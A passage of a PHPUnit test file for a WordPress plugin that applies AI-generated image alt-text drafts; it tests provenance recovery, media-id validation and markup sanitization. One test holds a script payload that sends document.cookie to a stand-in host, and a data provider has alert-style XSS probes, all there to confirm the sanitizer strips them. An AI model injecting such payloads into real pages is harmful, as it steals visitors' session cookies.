        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runB . '/apply');
        $request->set_param('run_id', $runB);
        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame([71], $response->get_data()['applied']);

        // Reader observable only — no apply-stamp recovered_from assertion first.
        $GLOBALS['__ac_get_posts_results'] = [71];
        $GLOBALS['__ac_posts'][71] = (object) ['ID' => 71, 'post_title' => 'Dog', 'post_type' => 'attachment'];
        $history = (new \AltContext\Api\Services\DescriptionHistoryService())->list_history(10);
        $this->assertSame(1, $history['total']);
        $this->assertSame(
            $runA,
            $history['items'][0]['provenance']['recovered_from']['origin'] ?? null,
            'list_history must surface recovered_from.origin=A after takeover (resolver-stamped)'
        );
        $this->assertSame(
            \AltContext\Api\AltTextWriteStatus::RECOVERY_KIND_RUN,
            $history['items'][0]['provenance']['recovered_from']['kind'] ?? null
        );
    }

    /**
     * R23-BR-20 [TEST-15]: two consecutive provenance-write failures must not
     * lose the true originator. Sequence:
     *   B generates bytes (partial + marker owned by B)
     *   A recovers, provenance write also fails (re-plant must keep B, not A)
     *   C completes → envelope recovered_from.origin names B, not A
     *
     * RED under: re-plant always writes the applying run as marker run_id
     * (intermediate A overwrites originator B).
     */
    public function testApplyRunDraftsTwoConsecutiveProvenanceFailuresPreserveOriginator(): void
    {
        $runB  = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';
        $runA  = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
        $runC  = 'cccccccc-cccc-cccc-cccc-cccccccccccc';
        $draft = 'a dog in a park';
        $this->plantPostType(71);

        // Run B: alt lands, provenance fails → partial, marker names B.
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $this->queueRunStatusResponse($runB, 'completed');
        $this->plantSubmittedMediaIds($runB, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runB,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);
        $reqB = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runB . '/apply');
        $reqB->set_param('run_id', $runB);
        $resB = $this->controller->apply_describe_run_drafts($reqB);
        $this->assertNotInstanceOf(\WP_Error::class, $resB);
        $this->assertSame([71], $resB->get_data()['partial']);
        $pendingAfterB = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pendingAfterB);
        $this->assertSame($runB, $pendingAfterB['run_id'] ?? null);

        // Run A: recovers from B's marker, provenance write fails again.
        // Re-plant must preserve originator B — not overwrite with A.
        $this->queueRunStatusResponse($runA, 'completed');
        $this->plantSubmittedMediaIds($runA, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runA,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);
        $reqA = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runA . '/apply');
        $reqA->set_param('run_id', $runA);
        $resA = $this->controller->apply_describe_run_drafts($reqA);
        $this->assertNotInstanceOf(\WP_Error::class, $resA);
        $this->assertSame([71], $resA->get_data()['partial'], 'A recovery with failing provenance stays partial');
        $pendingAfterA = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pendingAfterA);
        $this->assertSame(
            $runB,
            $pendingAfterA['run_id'] ?? null,
            're-plant after A must still name originator B, not intermediate A'
        );

        // Run C: completes provenance → envelope must name B.
        unset($GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance']);
        $this->queueRunStatusResponse($runC, 'completed');
        $this->plantSubmittedMediaIds($runC, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runC,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);
        $reqC = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runC . '/apply');
        $reqC->set_param('run_id', $runC);
        $resC = $this->controller->apply_describe_run_drafts($reqC);
        $this->assertNotInstanceOf(\WP_Error::class, $resC);
        $this->assertSame([71], $resC->get_data()['applied']);
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame($runC, $prov['run_id'] ?? null);
        $this->assertArrayNotHasKey('recovered_from_run_id', $prov);
        $this->assertIsArray($prov['recovered_from'] ?? null);
        $this->assertSame(
            $runB,
            $prov['recovered_from']['origin'] ?? null,
            'final envelope must name originator B after two consecutive failures'
        );
        $this->assertNotSame(
            $runA,
            $prov['recovered_from']['origin'] ?? null,
            'final envelope must not name intermediate recoverer A'
        );
        $this->assertSame(
            \AltContext\Api\AltTextWriteStatus::RECOVERY_KIND_RUN,
            $prov['recovered_from']['kind'] ?? null
        );
        $this->assertContains($runB, $prov['recovered_from']['chain'] ?? []);
    }

    /**
     * R23-BR-21 [TEST-15]: sentinel-owned marker recovered by bulk apply gets
     * kind=surface (not run). RED under: kind always set to run without consulting
     * MARKER_OWNERS (silent namespace collapse of cli/single_image into run uuid).
     */
    public function testApplyRunDraftsSentinelMarkerRecoveryUsesSurfaceKind(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $draft = 'a dog in a park';
        $this->plantPostType(71);
        $this->setPostMeta(71, '_wp_attachment_image_alt', $draft);
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id'     => \AltContext\Api\AltTextWriteStatus::MARKER_OWNER_CLI,
            'draft_hash' => \AltContext\Api\Services\DescriptionHistoryService::hash_for_stored_alt($draft),
        ]);

        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);
        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame([71], $response->get_data()['applied']);

        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertIsArray($prov['recovered_from'] ?? null);
        $this->assertSame(
            \AltContext\Api\AltTextWriteStatus::MARKER_OWNER_CLI,
            $prov['recovered_from']['origin'] ?? null,
            'origin must be the sentinel wire value verbatim'
        );
        $this->assertSame(
            \AltContext\Api\AltTextWriteStatus::RECOVERY_KIND_SURFACE,
            $prov['recovered_from']['kind'] ?? null,
            'sentinel owner must resolve to surface, not run'
        );
        $this->assertNotSame(
            \AltContext\Api\AltTextWriteStatus::RECOVERY_KIND_RUN,
            $prov['recovered_from']['kind'] ?? null
        );
    }

    /**
     * R23-BR-22 [TEST-15]: first write (no recovery) always emits recovered_from
     * with kind=none — distinguishable from same_run recovery. RED under: omit
     * the key on first write, or stamp same_run for every path.
     */
    public function testApplyRunDraftsFirstWriteEmitsExplicitNoRecoveryDescriptor(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $draft = 'a dog in a park';
        $this->plantPostType(71);
        // Fresh attachment — no alt, no marker, no provenance.
        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));

        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);
        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame([71], $response->get_data()['applied']);

        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertArrayHasKey('recovered_from', $prov, 'recovered_from must always be present');
        $this->assertArrayNotHasKey('recovered_from_run_id', $prov);
        $this->assertArrayHasKey('origin', $prov['recovered_from']);
        $this->assertNull($prov['recovered_from']['origin']);
        $this->assertSame(
            \AltContext\Api\AltTextWriteStatus::RECOVERY_KIND_NONE,
            $prov['recovered_from']['kind'] ?? null,
            'first write must use explicit none kind'
        );
        $this->assertNotSame(
            \AltContext\Api\AltTextWriteStatus::RECOVERY_KIND_SAME_RUN,
            $prov['recovered_from']['kind'] ?? null,
            'first write must be distinguishable from same-run recovery'
        );
        $this->assertSame([], $prov['recovered_from']['chain'] ?? null);
    }

    /**
     * R23-BR-18 discrimination: legitimate marker clear still works when the
     * own-run marker is dead evidence for the stored alt (stale draft_hash).
     * Failure mode of the live-marker preserve fix is a permanent lock.
     */
    public function testApplyRunDraftsStillClearsStaleOwnRunMarkerOnAltDivergeSkip(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $storedAlt = 'operator edited after partial';
        $draft     = 'a dog in a park';
        $this->plantPostType(71);
        $this->setPostMeta(71, '_wp_attachment_image_alt', $storedAlt);
        // Own-run marker for the *draft*, not the stored alt — stale / not live.
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id'     => $runId,
            'draft_hash' => \AltContext\Api\Services\DescriptionHistoryService::hash_for_stored_alt($draft),
        ]);
        $this->assertFalse(
            \AltContext\Api\Services\DescriptionHistoryService::is_live_recovery_marker_for_alt(
                get_post_meta(71, '_acx_description_provenance_pending', true),
                $storedAlt
            ),
            'precondition: marker must be stale for stored alt'
        );

        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([71], $data['skipped_existing']);
        // Legitimate clear: stale own-run marker must not permanently lock the attachment.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    public function testApplyReturns404WhenRunNotFound(): void
    {
        // D1-03: a status-endpoint 404 (run id does not exist) is surfaced as an
        // honest 404, not the generic 409 "current status: unknown".
        $runId = '99999999-9999-9999-9999-999999999999';
        $this->queueHttpResponse([
            'response' => ['code' => 404, 'message' => 'Not Found'],
            'body' => json_encode(['detail' => 'run not found']),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_not_found', $response->get_error_code());
        $this->assertSame(404, $response->get_error_data()['status'] ?? null);
        // Rejected after the status read, before fetching items.
        $this->assertCount(1, $this->getHttpCalls());
    }

    public function testGetRunItemsPassesThroughProxyWpErrorUnchanged(): void
    {
        // S2-02: a transport-level WP_Error from the proxy is returned untouched.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->queueHttpResponse(new \WP_Error('http_request_failed', 'connection refused'));

        $request = new WP_REST_Request('GET', '/acx/v1/recognition/describe/runs/' . $runId . '/items');
        $request->set_param('run_id', $runId);

        $response = $this->controller->get_describe_run_items($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('http_request_failed', $response->get_error_code());
    }

    public function testGetRunItemsPassesThroughBodyMissingItemsKey(): void
    {
        // S2-02: a 200 body without an 'items' key is passed through untouched.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode(['tenant_id' => self::currentTenantId(), 'run_id' => $runId]),
        ]);

        $request = new WP_REST_Request('GET', '/acx/v1/recognition/describe/runs/' . $runId . '/items');
        $request->set_param('run_id', $runId);

        $response = $this->controller->get_describe_run_items($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());
        $data = $response->get_data();
        $this->assertArrayNotHasKey('items', $data);
        $this->assertSame($runId, $data['run_id']);
    }

    /**
     * BR-129: without a locally recorded media_id set, apply fails closed (502).
     * Goes RED if apply falls back to trusting the remote items list.
     */
    public function testApplyFailsClosedWhenSubmittedMediaIdsMissing(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $this->queueRunStatusResponse($runId, 'completed');
        // Intentionally do NOT plant submitted media ids.
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'hostile draft', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_media_ids_unknown', $response->get_error_code());
        $this->assertSame(502, $response->get_error_data()['status'] ?? null);
        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    /**
     * BR-129: non-numeric media_id strings must be rejected, not (int)-coerced.
     * Submitted set deliberately includes 71 so that coercing "71junk"→71 would
     * pass membership and write — the strict parser is the only brake. Goes RED
     * if parse_strict_positive_int falls back to (int) casting.
     */
    public function testApplyRejectsNonNumericMediaIdWith502(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        // 71 is in the submitted set: coercion would authorize the write.
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    // Coercible junk: (int)"71junk" === 71 under the old path.
                    ['media_id' => '71junk', 'status' => 'completed', 'alt_text_draft' => 'injected alt', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_items_contract_violation', $response->get_error_code());
        $this->assertSame(502, $response->get_error_data()['status'] ?? null);
        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    /**
     * BR-129: a strict positive int media_id that was never submitted is also 502.
     */
    public function testApplyRejectsUnsubmittedStrictMediaIdWith502(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantSubmittedMediaIds($runId, [70]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'foreign target', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_items_contract_violation', $response->get_error_code());
        $this->assertSame(502, $response->get_error_data()['status'] ?? null);
        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    /**
     * BR-129: items response larger than the per-run media-id cap is 502.
     */
    public function testApplyRejectsItemsOverflowWith502(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        add_filter('acx_describe_run_max_items', static fn (): int => 2);
        $this->plantSubmittedMediaIds($runId, [70, 71]);
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => 'a', 'caption' => null, 'provenance' => null],
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'b', 'caption' => null, 'provenance' => null],
                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => 'c', 'caption' => null, 'provenance' => null],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_items_overflow', $response->get_error_code());
        $this->assertSame(502, $response->get_error_data()['status'] ?? null);
        $this->assertSame('', get_post_meta(70, '_wp_attachment_image_alt', true));
    }

    /**
     * BR-130 sibling: bulk-apply strips hostile markup from alt_text_draft before
     * writing _wp_attachment_image_alt. Distinct from DescribeMediaService's
     * normalize_alt_text_draft / alt_text_long paths — this is the apply loop
     * in DescribeController. Goes RED if the apply path writes the raw draft.
     */
    public function testApplyStripsHostileMarkupFromAltTextDraft(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueRunStatusResponse($runId, 'completed');
        $hostile = "<script>fetch('https://attacker.invalid/?c='+document.cookie)</script>A calm lake.";
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => 71,
                        'status' => 'completed',
                        'alt_text_draft' => $hostile,
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence'],
                    ],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());
        $this->assertSame([71], $response->get_data()['applied']);

        $stored = get_post_meta(71, '_wp_attachment_image_alt', true);
        $this->assertStringNotContainsString('<script>', $stored);
        $this->assertStringNotContainsString('attacker.invalid', $stored);
        $this->assertStringNotContainsString('document.cookie', $stored);
        $this->assertSame('A calm lake.', $stored);
    }

    /**
     * BR-133: bare `<` in prose must not truncate bulk-apply drafts.
     * Goes RED if apply still uses bare wp_strip_all_tags / strip_tags.
     *
     * @dataProvider bareLessThanDraftProvider
     */
    public function testApplyPreservesBareLessThanInAltTextDraft(string $draft, string $expected): void
    {
        $runId = '11111111-1111-1111-1111-111111111133';
        $this->plantPostType(71);
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => 71,
                        'status' => 'completed',
                        'alt_text_draft' => $draft,
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence'],
                    ],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame([71], $response->get_data()['applied']);
        $this->assertSame($expected, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertStringNotContainsString('<script>', (string) get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertStringNotContainsString('<img', (string) get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function bareLessThanDraftProvider(): array
    {
        return [
            'comparison' => ['x <= y', 'x &lt;= y'],
            'heart_prose' => [
                'Photo of a <3 shaped cloud above the lake',
                'Photo of a &lt;3 shaped cloud above the lake',
            ],
            'script_still_stripped' => [
                '<script>alert(1)</script>Safe text',
                'Safe text',
            ],
            'img_onerror_still_stripped' => [
                '<img src=x onerror=alert(1)>A photo.',
                'A photo.',
            ],
        ];
    }

    /**
     * BR-133 seam: partial → retry → recover must hash the *sanitized* draft
     * (same value written to alt and to the pending marker) when the draft
     * contains both markup and a bare `<`.
     */
    public function testApplyPartialRecoveryWithBareLessThanAndMarkup(): void
    {
        $runId = '11111111-1111-1111-1111-111111111134';
        $rawDraft = 'x <= y <script>alert(1)</script> and a <3 cloud';
        $expected = sanitize_text_field($rawDraft);
        // Script body removed; remaining whitespace collapsed by sanitize_text_field.
        $this->assertSame('x &lt;= y and a &lt;3 cloud', $expected);

        $this->plantPostType(71);
        $this->plantSubmittedMediaIds($runId, [71]);
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => 71,
                        'status' => 'completed',
                        'alt_text_draft' => $rawDraft,
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2'],
                    ],
                ],
            ]),
        ]);

        $first = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $first->set_param('run_id', $runId);
        $firstResponse = $this->controller->apply_describe_run_drafts($first);
        $this->assertNotInstanceOf(\WP_Error::class, $firstResponse);
        $this->assertSame([71], $firstResponse->get_data()['partial']);
        $this->assertSame($expected, get_post_meta(71, '_wp_attachment_image_alt', true));
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame(hash('sha256', $expected), $pending['draft_hash']);

        unset($GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance']);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => 71,
                        'status' => 'completed',
                        'alt_text_draft' => $rawDraft,
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2'],
                    ],
                ],
            ]),
        ]);

        $second = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $second->set_param('run_id', $runId);
        $secondResponse = $this->controller->apply_describe_run_drafts($second);
        $this->assertNotInstanceOf(\WP_Error::class, $secondResponse);
        $this->assertSame([71], $secondResponse->get_data()['applied']);
        $this->assertSame($expected, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame($runId, $prov['run_id']);
    }

    /**
     * BR-134: membership is durable — apply still works after 24h.
     * Goes RED if load_run_media_ids reintroduces a TTL gate.
     */
    public function testApplyWorksWhenMembershipOlderThan24Hours(): void
    {
        $runId = '11111111-1111-1111-1111-111111111135';
        $this->plantPostType(71);
        $this->plantSubmittedMediaIds($runId, [71], time() - 90000);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    [
                        'media_id' => 71,
                        'status' => 'completed',
                        'alt_text_draft' => 'still applyable',
                        'caption' => null,
                        'provenance' => ['adapter' => 'florence'],
                    ],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame([71], $response->get_data()['applied']);
        $this->assertSame('still applyable', get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    /**
     * BR-134 / BR-143: failed durable membership write must not report submit
     * success. Goes RED if store_run_media_ids discards update_option's return.
     * BR-143: WP_Error data carries run_id and the message names the run in prose.
     */
    public function testSubmitFailsLoudlyWhenMembershipWriteFails(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $runId = '11111111-1111-1111-1111-111111111136';
        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $runId,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);
        $optionKey = 'acx_describe_run_media_ids_' . $runId;
        $GLOBALS['__ac_update_option_fail'][$optionKey] = true;
        $GLOBALS['__ac_update_option_calls'] = [];

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_media_ids_store_failed', $response->get_error_code());
        $this->assertSame($runId, $response->get_error_data()['run_id'] ?? null);
        $this->assertStringContainsString('cannot be applied', $response->get_error_message());
        // BR-143: message must name the run id in prose for message-only clients.
        $this->assertStringContainsString($runId, $response->get_error_message());
        $this->assertFalse(get_option($optionKey, false));
        // BR-143: membership write is retried once before giving up.
        $this->assertSame(2, $GLOBALS['__ac_update_option_calls'][$optionKey] ?? 0);
    }

    /**
     * BR-134: index pruner drops age-expired membership options and leaves current.
     */
    public function testMembershipIndexPrunesByAge(): void
    {
        $oldRun = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
        $this->plantSubmittedMediaIds($oldRun, [1], time() - 31 * 86400);

        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $newRun = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';
        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $newRun,
                'status' => 'pending',
                'phase' => 'queued',
                'completed' => 0,
                'failed' => 0,
                'skipped' => 0,
                'total' => 1,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);
        $response = $this->controller->submit_describe_run($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $this->assertFalse(get_option('acx_describe_run_media_ids_' . $oldRun, false));
        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $newRun, false));
        $index = get_option('acx_describe_run_media_ids_index', []);
        $this->assertArrayNotHasKey($oldRun, $index);
        $this->assertArrayHasKey($newRun, $index);
    }

    /**
     * BR-134 / BR-142: index pruner caps at 200 by evicting entries older than the
     * 7-day retention floor (oldest first). Entries past the floor but under the
     * 30d hard age prune are eligible for cap eviction.
     *
     * Changed from the pre-BR-142 behaviour that evicted *any* oldest entry past
     * the cap (including same-day runs). Authorization outranks storage economy:
     * only aged-past-floor entries may be cap-evicted.
     */
    public function testMembershipIndexPrunesByCap(): void
    {
        $now = time();
        // All 200 entries are ~8–10 days old: older than the 7d floor, younger
        // than the 30d age prune — so cap eviction (not age) removes the oldest.
        for ($i = 0; $i < 200; $i++) {
            $runId = sprintf('cccccccc-cccc-cccc-cccc-%012d', $i);
            $this->plantSubmittedMediaIds($runId, [1], $now - (10 * 86400) + $i);
        }
        $oldestRun = sprintf('cccccccc-cccc-cccc-cccc-%012d', 0);
        $this->assertIsArray(get_option('acx_describe_run_media_ids_' . $oldestRun, false));

        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $newRun = 'dddddddd-dddd-dddd-dddd-dddddddddddd';
        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => json_encode([
                'run_id' => $newRun,
